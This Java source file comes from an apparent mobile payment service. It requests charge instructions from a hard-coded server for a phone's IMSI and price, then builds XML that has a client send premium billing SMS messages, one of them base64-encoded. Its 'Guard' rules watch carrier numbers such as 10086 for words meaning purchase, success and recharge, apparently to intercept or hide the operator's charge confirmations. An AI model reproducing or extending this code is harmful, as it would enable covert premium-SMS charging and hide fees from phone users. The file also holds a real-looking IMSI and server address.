package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * http://120.24.103.189/GameServer/requestChargeInfo?imsi=460001234576655&game_id=641616016241&channel_id=40949000&price=600&keyid=kqdgdxxxk
 * @author leoliu
 *
 */
public class HhkjWyDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(HhkjWyDynamicService.class);
	
	private static final String TYPE = "hhkjWy";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "imsi={imsi}&game_id={game_id}&channel_id={channel_id}&price={price}&keyid={keyid}";
	
	private static final Guard guard1 = new Guard("1065889955","成功|购买",1440,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			String game_id = map.get("game_id");
			String channel_id = map.get("channel_id");
			String price = map.get("price");
			String keyid = map.get("keyid");
			
			String param = REQUESTMODEL.replace("{imsi}",imsi).replace("{game_id}",game_id).replace("{channel_id}",channel_id).replace("{price}",price).replace("{keyid}",keyid);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson,map);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson,Map<String,String> map){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status_code = jo.getString("status_code");
				
				if("0".equals(status_code)){
					String sms0data = jo.getString("sms0data");
					String sms0to = jo.getString("sms0to");
					
					String sms1data64 = jo.getString("sms1data64");
					String sms1to = jo.getString("sms1to");
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(sms0data);
					sms.setSmsDest(sms0to);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms sms1 = new Sms();
					
					sms1.setSmsContent(CommonUtil.base64Decode(sms1data64.replaceAll(" ","+")));
					sms1.setSmsDest(sms1to);
					sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms1);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
					
					StringBuffer sb = new StringBuffer();
					
					sb.append(XstreamHelper.toXml(guardSms));
					sb.append(XstreamHelper.toXml(sms));
					
					String wait = map.get("wait");
					if(wait == null || wait.length() == 0){
						wait = "5";
					}
					
					sb.append("<wait>").append(wait).append("</wait>");
					sb.append(XstreamHelper.toXml(sms1));
					
					return sb.toString();					
				}				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		//http://120.24.103.189/GameServer/requestChargeInfo?imsi=460001234576655&game_id=641616016241&channel_id=40949000&price=600&keyid=kqdgdxxxk
		
		String url = "http://120.24.103.189/GameServer/requestChargeInfo";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("imsi", "460025399810374");
		map.put("type","hhkj");
		map.put("game_id", "641616016241");
		map.put("channel_id", "40949000");
		map.put("price","600");
		map.put("keyid", "kqdgdxxxk");
		
		System.out.println(new HhkjWyDynamicService().dynamic(map));
		
//		String s = "QlVCQFR8MCAgICAgIDlBTjg4QEEyV0BQQGw5NTVLNjJUSDk0QDk2NDg2Njk5QDgxODgxNDg0OTJAOEA5OTEwNjMxOTkzOTc3MTBAMzc3NTdANTY2NTQ2ODMyODg5NA==";
//		
//		try {
//			String s1 = CommonUtil.base64Decode(s);
//			
//			System.out.println(s1);
//		} catch (UnsupportedEncodingException e) {
//			e.printStackTrace();
//		} catch (IOException e) {
//			e.printStackTrace();
//		}
	}

}
